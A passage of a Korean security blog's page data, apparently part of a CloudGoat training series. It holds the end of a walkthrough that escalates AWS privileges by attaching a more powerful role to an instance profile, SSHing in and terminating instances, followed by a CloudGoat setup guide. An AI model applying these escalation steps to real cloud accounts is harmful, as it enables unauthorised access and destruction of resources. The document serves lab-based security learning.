cg-ec2-meek-role-&lt;CLOUD_GOAT_ID> --profile kerrigan\n\naws iam add-role-to-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-&lt;CLOUD_GOAT_ID> \\\n    --role-name cg-ec2-mighty-role-&lt;CLOUD_GOAT_ID> --profile kerrigan\n\n<span class=\"token property\">\"InstanceProfileName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token property\">\"RoleName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n\ncg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<h3 id=\"ssh를-통해-새로운-ec2에-액세스\" style=\"position:relative;\"><a href=\"#ssh%EB%A5%BC-%ED%86%B5%ED%95%B4-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2%EC%97%90-%EC%95%A1%EC%84%B8%EC%8A%A4\" aria-label=\"ssh를 통해 새로운 ec2에 액세스 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSH를 통해 새로운 EC2에 액세스</h3>\n<ul>\n<li>앞서 새로 생성된 EC2 인스턴스에 SSH로 접속해 보겠습니다. 미리 만들어 두었던 SSH 개인 키에 대한 권한 을 변경해주었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQY023MXW/SUACA4ZPB5kzBjbkUKZUB/bCUQml7Dod2tGXsQzDbjJqoF/4B4/+/fo3bhTHx4kneq1esRxF7u2Bra/bnimF7TOt8QHoasjcW3LZidu2EOyPmzpjzvhVzdRSyPvApGz7lwb+EN8sxukM6fZdArXFDSZrV2H6MmxUM5wpPFvTCDGue03EixIsTRKOFaP5HFK2w7YCLYYTW14RTTaau8ANJkpTMZgVpWhFMNHl5z9jNeHls0mx0OGyePTt8dtQ8Qzh+ymtzTNfySeUG788oq3BGEZOpZhKtCKPVU+v8+qnNNy4nnQFGu48Q7b8arxBSljheTBBmVJs9SlXk9Qd6cc0iK1HLDYv0kji5RC5rwqnCsn36b9/R7TmY3TE9y8O0HEbHA8TP3Y7H+wfK+obPX77z8eET28dvXHz9hSo2yCwnmMQkqWapS6QqyGROXtSo5Rq9qqiqG1bVlh+nmt8XG7B4I7ji+gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"15\"\n        title=\"15\"\n        src=\"/static/0d48dd6ec2cccabf794960e4c36c5e23/37523/15.png\"\n        srcset=\"/static/0d48dd6ec2cccabf794960e4c36c5e23/e9ff0/15.png 180w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/f21e7/15.png 360w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/37523/15.png 720w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/9a86a/15.png 792w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>새로 생성된 EC2 인스턴스의 공용 IP 대역을 query를 조회하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances \\\n --query <span class=\"token string\">\"Reservations[*].Instances[*].PublicIpAddress\"</span> \\\n --output text \\\n --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+klEQVQY013MyU7CUACF4ZvgBKghUEpACKCU21460TpFY0mD1QDGKeKwcOnOV3BR9XF8x9/YEGNcfDmLc3JELG2ep1OC/WOiKCEeTzg/u6B384IXzzgdJbyqKal7x0f4mEmH97wHD7w5t6T+nM/dJ1J3ztfyNUIvNek0Jc32AEOGbLUUmr5DXe9SrW5T1rpYZQt7U2KXTLyKjVcZ0Flq0RC1TF3oWWq5GqJa76PcI4bhKDsqbjQQooAQq4v8kV9Y+yP/ry8gckWE4x5weTXnJEowVUBfeigVsO6PqRlDLOnR7pj0DAdLBUjTxzBcbGfvd+v5hwxUyGTF5hsyCHVl/RUeOQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"16\"\n        title=\"16\"\n        src=\"/static/0b1fc87c79ea16cafa3b22a084fd0df1/37523/16.png\"\n        srcset=\"/static/0b1fc87c79ea16cafa3b22a084fd0df1/e9ff0/16.png 180w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/f21e7/16.png 360w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/37523/16.png 720w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/4e6ec/16.png 827w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>3개 가 출력된 것은 기존에 만들어 두었던 인스턴스가 걸린 정보이고 새로운 정보는 큐형태로 마지막 <code class=\"language-text\">3.90.208.120</code> IP 대역입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">ssh -i fake-ec2.pem ubuntu@<span class=\"token number\">3.90</span>.<span class=\"token number\">208.120</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXElEQVQ4y31T2VLbQBBcg40PHT51WPKl+wLbspBdAkICpCp5yv//TadmhF0GnDxM9e5ObW9Pz6z4sylQ7h8Rp/fI7vYodg/wq19IDm/Y75+xyR9wqF6x3lZYLBOsnAyev0YY5XCcDOY8gDdwUXUSHOQU4r58QXZXIS++Y5N/gxfuUORPqKqfKPavKA9veHj6zbjdPXPsyh8oyhcMRksI0YNoKBBXUh3J7QH2PEEY38PxNli5a5h2hCAq4AVbWLMYbrDlnOvXOJqs0B/O0ZVMXDWHuG4O0WyOOIRphYiSErrpQ1Kt02U/zJlgtkghqzZfFIKU9CEaKkfjesDnhMe1mC8zJqRXqYRaWX7CJDvAD3eca7XHtaLWkPFIdlwz4UR3WZ1m+JgYHnqyiU7PgNK3MbUjPqfSSCXFUeVnZSdC8i5O96DSSS1dIjJ1MMPKW3POsEKuQDM8Rlm1TqSfQ5DpVB75ZS9SqIM5SDVdNKYBqycc6y5a7QmrJ/ys7ERI3SJSMp+6XWPKimk/tWPOU9lEQsouNeNESMpoVHQzYIL56hajiVN3UkgQQq6D9tThM/8uKmx3dX693dXQlQnrPZV205ngpqPhpquh09P5rN3TPyj8Qkj+xWkJL8wRpSV7SWdBtEMQF7jbPGLh3LIVlDsv/6LC2TJjv8j8sebwBdqbVsQkZAV1nJQRUU+e/p+QhpZepiE+dpZwrLkcSn/GQ13Pa8CzSXjdGl0u+aiO/7AVskJaEwn5KSlW7d27t5Iy5Vn9J6E6nkIZm5CGBpSRCXnw/m/PuvohGv0v//ic8C+FZpOvQkSe2AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"17\"\n        title=\"17\"\n        src=\"/static/76a4fa87e881ac50c20140b663badf06/37523/17.png\"\n        srcset=\"/static/76a4fa87e881ac50c20140b663badf06/e9ff0/17.png 180w,\n/static/76a4fa87e881ac50c20140b663badf06/f21e7/17.png 360w,\n/static/76a4fa87e881ac50c20140b663badf06/37523/17.png 720w,\n/static/76a4fa87e881ac50c20140b663badf06/65654/17.png 872w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>성공 적으로 연결이 완료되었다면 <code class=\"language-text\">cg-ec2-mighty-role-/cloud goat id/</code> 연결된 IAM Rule 및 정책을 열거하겠습니다.</li>\n<li>SSH 연결한 EC2 인스턴스에 AWS CLI를 설치 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-policies --query <span class=\"token string\">\"Policies[?starts_with(PolicyName, 'cg')]\"</span>\n\n aws iam get-policy-version \\\n --policy-arn <span class=\"token string\">\"arn:aws:iam::ACCOUNT-ID:policy/cg-ec2-mighty-policy\"</span>  \\\n --version-id <span class=\"token string\">\"v1\"</span></code></pre></div>\n<ul>\n<li>해당 서버에서 EC2 인스턴스 관리자 권한을 획득한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances --region us-east<span class=\"token number\">-1</span>\n aws ec2 terminate-instances --instance-ids &lt;instanceId> --region us-east<span class=\"token number\">-1</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#kerrigan-iam-profile\">Kerrigan IAM Profile</a></li>\n<li><a href=\"#%EA%B6%8C%ED%95%9C-%EC%97%AD%ED%99%9C%EC%9D%84-%ED%8C%8C%EC%95%85%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95\">권한 역활을 파악하는 방법</a></li>\n<li><a href=\"#ec2-key-pair-%EC%83%9D%EC%84%B1\">EC2 Key pair 생성</a></li>\n<li><a href=\"#%EC%B5%9C%EA%B3%A0-%EA%B4%80%EB%A6%AC%EC%9E%90-iam-instance-%ED%94%84%EB%A1%9C%ED%95%84%EC%9D%84-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2-instance%EB%A1%9C-%EB%B3%80%EA%B2%BD\">최고 관리자 IAM Instance 프로필을 새로운 EC2 Instance로 변경</a></li>\n<li><a href=\"#ssh%EB%A5%BC-%ED%86%B5%ED%95%B4-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2%EC%97%90-%EC%95%A1%EC%84%B8%EC%8A%A4\">SSH를 통해 새로운 EC2에 액세스</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 5 (CloudGoat: IAM Privilege Escalation By Attachment)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-5/"}},"prev":{"id":"c9d7e71f-e3df-5a7e-9d54-77d8ff5ae8f2","html":"<h1 id=\"클라우드-서비스-취약점-분석-1\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-1\" aria-label=\"클라우드 서비스 취약점 분석 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 1</h1>\n<aside>\n💡  클라우드 서비스 취약점 분석 연습을 위해 Rhino Security Lab의 CloudGoat 실습을 진행하도록 하겠습니다.\n<p>다음은 참조 CloudGoat Github 링크입니다.</p>\n<p><a href=\"https://github.com/RhinoSecurityLabs/cloudgoat\">https://github.com/RhinoSecurityLabs/cloudgoat</a></p>\n</aside>\n<h1 id=\"실습-환경-구성\" style=\"position:relative;\"><a href=\"#%EC%8B%A4%EC%8A%B5-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%84%B1\" aria-label=\"실습 환경 구성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>실습 환경 구성</h1>\n<h3 id=\"필수-설치-패키지\" style=\"position:relative;\"><a href=\"#%ED%95%84%EC%88%98-%EC%84%A4%EC%B9%98-%ED%8C%A8%ED%82%A4%EC%A7%80\" aria-label=\"필수 설치 패키지 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>필수 설치 패키지</h3>\n<ul>\n<li>Linux or MacOS. Windows is not officially supported.\n<ul>\n<li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</li>\n</ul>\n</li>\n<li>Python3.6+ is required.</li>\n<li>Terraform >= 0.14 <a href=\"https://learn.hashicorp.com/terraform/getting-started/install.html\">installed and in your $PATH</a>.</li>\n</ul>\n<p><a href=\"https://learn.hashicorp.com/tutorials/terraform/install-cli\">Install Terraform | Terraform - HashiCorp Learn</a></p>\n<ul>\n<li>The AWS CLI <a href=\"https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html\">installed and in your $PATH</a>, and an AWS account with sufficient privileges to create and destroy resources.</li>\n<li><a href=\"https://stedolan.github.io/jq/\">jq</a></li>\n</ul>\n<p><a href=\"https://stedolan.github.io/jq/\">jq</a></p>\n<h3 id=\"설치\" style=\"position:relative;\"><a href=\"#%EC%84%A4%EC%B9%98\" aria-label=\"설치 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>설치</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">$ git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//github.com/RhinoSecurityLabs/cloudgoat.git</span>\n$ cd <span class=\"token class-name type-declaration\">cloudgoat</span>\n$ pip3 install <span class=\"token operator\">-</span>r <span class=\"token operator\">.</span><span class=\"token operator\">/</span>core<span class=\"token operator\">/</span>python<span class=\"token operator\">/</span>requirements<span class=\"token operator\">.</span><span class=\"token class-name type-declaration\">txt</span>\n$ chmod u<span class=\"token operator\">+</span>x cloudgoat<span class=\"token operator\">.</span>py</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAo0lEQVQI13WOOw6CQAAFUQmxUxIMirKAyB92RQSjUGii9z/SGCmNFq+YYiZPi5ITrlewskO8oGQnMhxRsHZz9gfF1k3Zxxkikdi+QjcsJrMlU938OS2Ma4RfYm8imvaBPA5I1VPJG931SZp3VGqgu72QTc/MMNGmi1H+hL/jWpK1eEHF2olR9UBRXcnKC1HacDrfidNm5CBvcbwI0xIY89Xfl28E+0/iErUWYgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/e4fa6c27ca6e77a3c59139f0577597f1/37523/0.png\"\n        srcset=\"/static/e4fa6c27ca6e77a3c59139f0577597f1/e9ff0/0.png 180w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/f21e7/0.png 360w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/37523/0.png 720w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/71c8e/0.png 875w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY03WQ3QoCIRCF9/0fL+hy6SaiHdPWn1x1XE+MVhCRcGD8js5wZopxwyNu2PcdtdYfCW+t/RXXCuaCmTbMlDA550BEMEbDGANrLdZ17bLOwns/6hf/8q3tf4zWOJ4Ih/mKKYSA82XBojTU7Q4ZII+11r0ZKcJC1JkMlibivWtSqt9jcHh4i0kipVzBVSKPeMKYGWhAKhm5lBGP+ePLOuQkzmM1wlvDE3dkNSM8iDotAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/9e04904dd6fc1d129d314db67fedd32e/37523/1.png\"\n        srcset=\"/static/9e04904dd6fc1d129d314db67fedd32e/e9ff0/1.png 180w,\n/static/9e04904dd6fc1d129d314db67fedd32e/f21e7/1.png 360w,\n/static/9e04904dd6fc1d129d314db67fedd32e/37523/1.png 720w,\n/static/9e04904dd6fc1d129d314db67fedd32e/302a4/1.png 1080w,\n/static/9e04904dd6fc1d129d314db67fedd32e/07a9c/1.png 1440w,\n/static/9e04904dd6fc1d129d314db67fedd32e/99375/1.png 1525w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 추가를 누른 후 AWS IAM Full-Admin 권한의 사용자 생성을 진행하여 cloudgoat 환경에서 다양한 인스턴스및 여러 기능들을 수행할 수 있도록 환경 구성을 진행해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWElEQVQ4y52Ty07DMBBF/e98CztW7PgAVrBFQhVCiCpN82iS+v2IfZHtNmpKgJaRjpxxkhlf6w6hdA8pJWJ47ydCCIml/HT/HILzCAH7fW6itYZSCkKIBGMcxpjDZ2ER4p2FcxbjmDuM44i+71PRCOc8FXNunH76LYjTHIZ1aJsadV2jLEtsNiWqqkp5PNFP8hYlr3cat48F3koK70ySqXVe/xOk6jkent6x+thACjZJjQzDcDXEWYN6vcJ2u0XVdOj7YSp2WvxSyOgDjKSQSkMoC2PdzCbXQpxz4EKCMQbOWVqjZZY8eVFB70coKSA4Az3Y5Mi5uY+2Olpsvp/fESEVimqHz3pA0+7Qtjt0XYeqqtE0LeqmAaVs8iOlNOVCyNyYcTCalUXIa0Fxc/eC++cCWuVpiJaJV2GtTfxl5plt4nGN1rBGZw8qnSTMp/H7DOfngODnV/IFFqf1Xxjnq18AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/ddc19233c1789764932065ff72685f2c/37523/2.png\"\n        srcset=\"/static/ddc19233c1789764932065ff72685f2c/e9ff0/2.png 180w,\n/static/ddc19233c1789764932065ff72685f2c/f21e7/2.png 360w,\n/static/ddc19233c1789764932065ff72685f2c/37523/2.png 720w,\n/static/ddc19233c1789764932065ff72685f2c/91b29/2.png 983w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AdministratorAccess 정책 권한을 설정한후 해당 access-key, secret-key를 저장하여 AWS cli profile를 설정을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">$ aws configure <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile cloudgoat\n\ncat <span class=\"token operator\">~</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>aws<span class=\"token operator\">/</span>credentials\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span>\naws_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\naws_secret_access_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span>\ncat <span class=\"token operator\">~</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>aws<span class=\"token operator\">/</span>config\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span>\nregion <span class=\"token operator\">=</span> us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span>\n</code></pre></div>\n<ul>\n<li>설정이 완료되면 credentials, config 파일에 각각 저장이 됩니다.</li>\n<li>앞에서 설정한 각 정보들을 그대로 cloudgoat 에 적용하여 설치를 마무리 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>cloudgoat<span class=\"token punctuation\">.</span>py config profile\n$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>cloudgoat<span class=\"token punctuation\">.</span>py config whitelist <span class=\"token operator\">-</span><span class=\"token operator\">-</span>auto</code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%ED%95%84%EC%88%98-%EC%84%A4%EC%B9%98-%ED%8C%A8%ED%82%A4%EC%A7%80\">필수 설치 패키지</a></li>\n<li><a href=\"#%EC%84%A4%EC%B9%98\">설치</a></li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 1 (클라우드 서비스 취약점 및 공격 벡터)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-1/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/cloud-service-vuln-0/","nextSlug":"/cloud-service-vuln-5/","prevSlug":"/cloud-service-vuln-1/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}